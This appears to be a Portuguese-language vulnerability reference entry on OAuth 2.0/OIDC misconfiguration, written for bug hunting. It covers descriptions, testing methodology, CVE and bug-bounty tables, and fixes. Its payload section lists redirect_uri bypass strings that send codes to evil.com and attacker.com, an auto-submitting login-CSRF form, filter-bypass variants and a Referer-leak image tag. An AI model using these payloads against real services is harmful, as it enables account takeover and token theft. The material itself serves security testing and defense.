---
id: oauth_misconfiguration
title: "OAuth 2.0 / OIDC Misconfiguration"
module: "oauth"
severity: "CRITICAL"
cwe_id: "CWE-352"
cwe_title: "Cross-Site Request Forgery (CSRF)"
cvss_vector: "AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N"
vrt_id: "broken_authentication_and_session_management.oauth_misconfiguration"
---

## Summary
Falhas em fluxos OAuth 2.0/OIDC -- `state` ausente, `redirect_uri` permissivo, PKCE não exigido, tokens vazados ou escopo excessivo -- permitem account takeover, roubo de token e acesso indevido a recursos.

## Description
OAuth 2.0 delega autorização entre resource owner, client, authorization server e resource server. O fluxo de autorização é seguro apenas quando o client valida o `state`, o authorization server exige correspondência exata de `redirect_uri`, o código é de uso único e vinculado ao client/PKCE, e os tokens são transportados em canais protegidos.

Problemas comuns:

- **CSRF no fluxo de autorização:** ausência ou reutilização de `state` permite que o atacante faça o navegador da vítima concluir um fluxo com a conta do atacante (login CSRF) ou vincule uma conta social maliciosa.
- **redirect_uri permissivo:** validação por prefixo, regex, path traversal, subdomínio controlado, wildcard ou `@` permite desviar o `code`/token para o atacante.
- **PKCE ausente:** em clients públicos (SPA, mobile), o `code` interceptado pode ser trocado por token.
- **Implicit flow:** tokens no fragmento da URL ficam expostos a histórico, Referer e XSS.
- **Token leakage:** `access_token` em query string, logs, Referer, mensagens de erro ou open redirect.
- **Escopo excessivo / scope upgrade:** client solicita escopos administrativos ou o servidor ignora o escopo consentido.
- **Pre-account takeover:** e-mail não verificado no provedor permite que o atacante crie conta com o e-mail da vítima antes do primeiro login social.
- **OIDC mal validado:** `iss`, `aud`, `nonce`, `azp`, `at_hash` não verificados; JWKS aceito de qualquer issuer.

## Impact
- Account takeover completo, inclusive de contas administrativas.
- Roubo de access/refresh tokens e acesso persistente a APIs e dados.
- Login CSRF: vítima opera na conta do atacante e vaza dados/arquivos.
- Autorização indevida entre tenants e escalada de escopo.
- Vazamento de PII, dados financeiros e comunicações; impacto CRITICAL.

## Payloads and Bypasses
```text
# CSRF: remover state, reutilizar state ou usar state previsível
GET /oauth/authorize?client_id=app&redirect_uri=https://alvo.com/cb&response_type=code&scope=openid
GET /oauth/authorize?client_id=app&redirect_uri=https://alvo.com/cb&response_type=code&state=fixed

# redirect_uri bypass
redirect_uri=https://alvo.com.evil.com/cb
redirect_uri=https://evil.com/cb
redirect_uri=https://alvo.com@evil.com/cb
redirect_uri=https://alvo.com%2f@evil.com/cb
redirect_uri=https://alvo.com%5c@evil.com/cb
redirect_uri=https://alvo.com/cb/../../evil
redirect_uri=https://alvo.com/cb?next=https://evil.com
redirect_uri=https://alvo.com/cb%23@evil.com
redirect_uri=https://alvo.com/cb%00.evil.com
redirect_uri=https://alvo.com:443@evil.com

# Path confusion
redirect_uri=https://alvo.com/callback/..%2f..%2fevil
redirect_uri=https://alvo.com/callback%2f..%2f..%2fevil

# Implicit / token leakage
response_type=token
response_type=id_token token
redirect_uri=https://alvo.com/cb#access_token=...
```

PoC de login CSRF:
```html
<form action="https://alvo.com/oauth/authorize" method="GET">
  <input name="client_id" value="app">
  <input name="redirect_uri" value="https://alvo.com/cb">
  <input name="response_type" value="code">
  <input name="scope" value="openid email profile">
</form>
<script>document.forms[0].submit()</script>
```

Variações de bypass de WAF/filtros:
```text
- Codificação dupla do host: https://alvo.com%252eevil.com
- Unicode/IDN: https://alvo.com。evil.com
- Backslash: https://alvo.com\@evil.com
- Fragmento e query: https://alvo.com/cb#https://evil.com
- Redirecionamento encadeado: redirect_uri aponta para open redirect no domínio confiável
- Case: HTTPS://ALVO.COM@EVIL.COM
```

HackerOne intel (tecnicas avancadas):
```text
-- IDN homograph redirect_uri bypass (H1: Semrush #861940, 265 upvotes)
-- Cyrillic 'а' (U+0430) no lugar de Latin 'a' (U+0061)
redirect_uri=https://tаrget.com/callback

-- Path traversal em redirect_uri (H1: GSA Bounty #665651, 67 upvotes)
redirect_uri=https://target.com/callback/../../../attacker.com
redirect_uri=https://target.com/callback/..%2F..%2Fattacker.com

-- Fragment-based bypass
redirect_uri=https://target.com/callback#@attacker.com

-- Open redirect chain para roubo de OAuth code (H1: Uber #202781, 427 upvotes)
redirect_uri=https://target.com/redirect?url=https://attacker.com

-- Subdomain takeover chain (H1: Shopify #740989, 527 upvotes)
redirect_uri=https://abandoned-subdomain.target.com/callback

-- OAuth code theft via referer leakage (H1: Rockstar Games, 4 reports, 420+ upvotes)
-- Callback page carrega recursos externos (imagens/scripts CDN)
-- Authorization code no ?code= vaza via header Referer para servidor externo
-- PoC: injetar imagem no dominio da callback: <img src="https://attacker.com/pixel.gif">

-- Forced OAuth authorization via UI bypass (H1: LinkedIn #2649615, 79 upvotes)
-- Exploitar button ID no hash + segurar espaco para forcar autorizacao
```

Casos reais e mentalidade de ataque (RWBH): Facebook, Uber e Twitter ilustram os tres padroes mais recorrentes -- `redirect_uri` permissivo, `state` ausente e vazamento de token em URLs/Referer. Shopify (527 upvotes) mostra OAuth misconfiguration em apps first-party. Rockstar Games (4 reports) demonstra que referer leakage e um vetor subestimado. Semrush (265 upvotes) prova que IDN homograph bypassa validacao de dominios.

## Target Context (Crawler Hints)
- **Parâmetros comuns:** `client_id`, `redirect_uri`, `response_type`, `scope`, `state`, `nonce`, `code`, `access_token`, `id_token`, `refresh_token`, `grant_type`, `code_verifier`.
- **Paths comuns:** `/oauth/authorize`, `/oauth/token`, `/oauth/introspect`, `/oauth/revoke`, `/login/oauth`, `/.well-known/openid-configuration`, `/.well-known/jwks.json`, `/callback`.
- **Sinais:** `state` ausente; `redirect_uri` com wildcard; `response_type=token`; `scope` amplo; `nonce` não validado; tokens em URL.

## Escalation Techniques
- **Account takeover via redirect_uri:** se `redirect_uri` aceita wildcards ou subdominios, atacante redireciona authorization code para dominio controlado e troca por access token.
- **Token leak via Referer:** se `response_type=token`, o access token aparece no fragment da URL e pode vazar via Referer para recursos carregados na callback page.
- **CSRF no login:** sem `state`, atacante forca vitima a logar com conta do atacante (login CSRF) para capturar dados inseridos pela vitima.
- **Scope escalation:** testar se o authorization server permite ampliar `scope` alem do permitido pelo client registration.
- **Token reuse:** access tokens sem audience (`aud`) restriction podem ser usados em outros servicos que confiam no mesmo IdP.
- **Chaining com open redirect:** open redirect no dominio do client permite bypass de redirect_uri validation para exfiltrar codes/tokens. H1: Uber #202781 (427 upvotes) -- chain com Facebook OAuth para roubar token; CS Money #905607 (356 upvotes); LY Corp #3423013 ($1K).
- **OAuth -> ATO via referer leakage** -- Pagina de callback carrega recursos externos (imagens, scripts, CDN) e o authorization code vaza no header Referer para servidor do atacante. Especialmente efetivo quando a callback page tem conteudo dinamico ou user-generated. H1: Rockstar Games #488269 (200 upvotes), #787160 (112 upvotes), #482743 (71 upvotes), #342709 (39 upvotes).
- **SSO bypass de 2FA** -- Sign in with Apple/Google/GitLab cria sessao que bypassa requisito de 2FA existente na conta. O IdP autentica o usuario mas o service provider nao re-verifica 2FA. H1: Cloudflare #1593404 ($1K, 32 upvotes).
- **Race condition no token exchange** -- Requests concorrentes de token exchange podem ser exploradas para obter multiplos access tokens a partir de um unico authorization code, ou reusar codes que deveriam ser single-use. H1: IBB #55140 (51 upvotes); Razer #699112 ($250).
- **IDN homograph redirect_uri** -- Dominio Unicode confundivel com dominio real (ex.: Cyrillic 'а' vs Latin 'a') passa validacao de redirect_uri quando o server nao normaliza Unicode antes de comparar. H1: Semrush #861940 (265 upvotes).
- **Email verification bypass -> ATO em third parties** -- Criar conta no IdP com email da vitima sem verificacao, depois usar OAuth para logar em servicos que confiam no IdP. H1: GitLab #922456 ($3K, 257 upvotes).
- **First-party app OAuth misconfiguration** -- Apps first-party com redirect_uri permissivo ou privilegios excessivos. H1: Shopify Stocky #740989 (527 upvotes).

## Hunting Methodology
1. Testar `redirect_uri` manipulation: subdomains (`sub.attacker.com`), path traversal (`/../attacker`), userinfo (`attacker.com@legitimate.com`), schema (`http` vs `https`).
2. Verificar se `state` esta presente e e validado -- remover `state` do request e verificar se o fluxo prossegue.
3. Testar implicit flow (`response_type=token`) -- verificar se tokens aparecem na URL.
4. Verificar PKCE: enviar `code_verifier` diferente do `code_challenge` e verificar se o token endpoint rejeita.
5. Testar token leaks: carregar recursos de terceiros na callback page e verificar Referer.
6. Inspecionar `.well-known/openid-configuration` para client registration e endpoints expostos.

## False Positive Indicators
- `redirect_uri` validado por correspondencia exata contra allowlist -- manipulacao falha.
- `state` presente e vinculado a sessao -- CSRF no OAuth esta protegido.
- PKCE habilitado com `S256` -- code interception nao e viavel.
- Implicit flow desabilitado e todos os tokens sao entregues via backend (authorization code flow) -- token nao vaza para browser.
- Authorization code e single-use e vinculado ao client -- race condition no token exchange nao e viavel.
- Callback page nao carrega recursos de dominios externos -- referer leakage de codes nao ocorre.
- IdP normaliza Unicode/IDN antes de validar redirect_uri -- homograph attack nao funciona.
- 2FA e re-verificado apos login via SSO -- bypass de 2FA via IdP nao e possivel.

## Notable CVEs

| CVE | Produto | Ano | Descricao | Tipo |
|-----|---------|-----|-----------|------|
| CVE-2025-4143 | Cloudflare workers-oauth-provider | 2025 | Validacao insuficiente de redirect_uri permite roubo de authorization code em clients OAuth | redirect_uri Bypass |
| CVE-2023-6291 | Keycloak | 2023 | Bypass de validacao de redirect_uri permite roubo de access token via dominio controlado pelo atacante | redirect_uri Bypass |
| CVE-2023-28131 | Expo AuthSession (React Native) | 2023 | Open redirect na callback AuthSession permite roubo de OAuth token -- redirect_uri sem validacao adequada | OAuth Token Theft |
| CVE-2023-27490 | NextAuth.js | 2023 | CSRF na callback OAuth permite fixacao de sessao e account takeover em aplicacoes Next.js | OAuth CSRF |
| CVE-2020-15234 | ORY Fosite (Go OAuth2 SDK) | 2020 | Validacao de redirect_uri por prefixo permite roubo de authorization code via path traversal | redirect_uri Bypass |
| CVE-2016-4977 | Spring Security OAuth2 | 2016 | RCE via injecao SpEL no endpoint de approval do fluxo OAuth2 -- atacante executa codigo arbitrario | OAuth Endpoint RCE |

## Notable HackerOne Reports

| Report | Programa | Upvotes | Bounty | Tecnica |
|--------|----------|---------|--------|---------|
| #740989 | Shopify | 527 | $0 | First-party app OAuth misconfiguration (Stocky) |
| #202781 | Uber | 427 | $0 | Chain: open redirect + Facebook OAuth -> token theft |
| #110293 | X/xAI | 276 | $0 | Callback validation insuficiente -> ATO Periscope |
| #861940 | Semrush | 265 | $0 | IDN homograph redirect_uri bypass |
| #922456 | GitLab | 257 | $3,000 | Email verification bypass -> ATO em third parties |
| #1861974 | pixiv | 253 | $2,000 | Roubo de authorization code via redirect_uri |
| #398799 | GitLab | 238 | $4,000 | Blind SSRF no controller de autorizacao OAuth Jira |
| #488269 | Rockstar | 200 | $0 | Facebook OAuth code theft via screenshot viewer |
| #787160 | Rockstar | 112 | $0 | Referer leakage -> Facebook OAuth token theft |
| #55140 | IBB | 51 | $0 | Race conditions em implementacoes OAuth 2 |

## Recommendation
1. Exigir `state` criptograficamente aleatório, vinculado à sessão e de uso único; rejeitar requisições sem `state`.
2. Validar `redirect_uri` por correspondência exata contra allowlist registrada; não usar prefixo, regex ou wildcard. Normalizar e rejeitar userinfo, fragmentos e path traversal.
3. Exigir PKCE (`S256`) para clients públicos e, idealmente, para todos; vincular o `code` ao `client_id` e ao `code_verifier`.
4. Desabilitar implicit flow e client credentials em browsers; usar authorization code + PKCE.
5. Validar `iss`, `aud`, `azp`, `nonce`, `exp`, `iat` e assinatura do ID token com JWKS do issuer correto.
6. Não colocar tokens em query string; usar fragmento apenas em fluxos legados e nunca registrar tokens em logs.
7. Aplicar escopo mínimo e consentimento explícito; validar escopo no resource server, não apenas no token.
8. Exigir e-mail verificado antes de vincular contas sociais; implementar confirmação para prevenir pre-account takeover.
9. Rotacionar refresh tokens, permitir revogação e detectar reutilização.
10. Exemplo de validação de redirect:
```java
Set<String> allowed = Set.of("https://app.alvo.com/callback", "https://admin.alvo.com/callback");
URI uri = URI.create(redirectUri);
if (!allowed.contains(uri.toString()) || uri.getUserInfo() != null || uri.getFragment() != null) {
    throw new OAuth2AuthenticationException("invalid_redirect_uri");
}
```
